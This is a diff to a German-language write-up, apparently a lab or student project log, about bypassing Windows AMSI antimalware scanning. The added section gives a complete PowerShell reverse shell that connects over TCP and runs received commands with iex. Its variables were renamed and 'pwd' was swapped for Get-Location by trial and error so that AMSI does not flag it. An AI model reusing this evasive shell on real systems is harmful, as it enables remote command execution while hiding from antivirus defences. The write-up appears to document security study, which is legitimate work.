@@ -37,7 +37,37 @@ Die Fehlermeldung wird durch das Antimalware Scan Interface (kurz. AMSI) aufgeru
 - JavaScript und VBScript
 - VBA-Makros in Office
 
-AMSI ist kein unbekanntes System, weshalb es einigen Anwendern gelungen einen Bypass zu erschaffen. Dazu wird die `amsi.dll` mit dem Ziel manipuliert, dass bosthafter Code als sauber zu indentifiziert wird.    
+AMSI ist kein unbekanntes System, weshalb es einigen Anwendern gelungen einen Bypass zu erschaffen. Dazu wird die `amsi.dll` mit dem Ziel manipuliert, dass bosthafter Code als sauber zu indentifiziert wird. Dies ist ein Thema für sich, weshalb für diese Arbeit ein anderer Bypass gewählt wurde. Für die Analyse wurde der Code Zeile für Zeile ausgeführt. So konnte bestimmt werden, an welcher Stelle AMSI ausschlägt:
+
+```
+$sendback2  = $sendback + "PS " + (pwd).Path + "> "
+```
+"pwd": Gibt den aktuellen Pfad wieder. Es scheint, als ist "pwd" in diesem Kontext ein Signal für Schadsoftware/Skript. Alternative kann in Powershell der Befehl ```GET-Location``` ausgeführt werden.
+
+Durch Trial and Error ensteht der folgende angepasste Powershell-Code:
+```
+$hmGuXO='127.0.0.1'
+$port = 4422
+$client = New-Object System.Net.Sockets.TCPClient($hmGuXO,$port);
+$SAAAD = $client.GetStream()
+
+[byte[]]$bytes = 0..65535|%{0}
+
+$sendbyte = ([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'> ')
+$SAAAD.Write($sendbyte,0,$sendbyte.Length)
+
+while(($i = $SAAAD.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+    $sendback = (iex $data 2>&1 | Out-String )
+   $sendback2  = $sendback + "PS " + (pwd).Path + "> "
+   $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+  $SAAAD.Write($sendbyte,0,$sendbyte.Length)
+ $SAAAD.Flush()}
+    
+$client.Close()
+
+```
+
 
 ---
 28.01.: Code angepasst vom Server -> Upload zum Webserver mit 
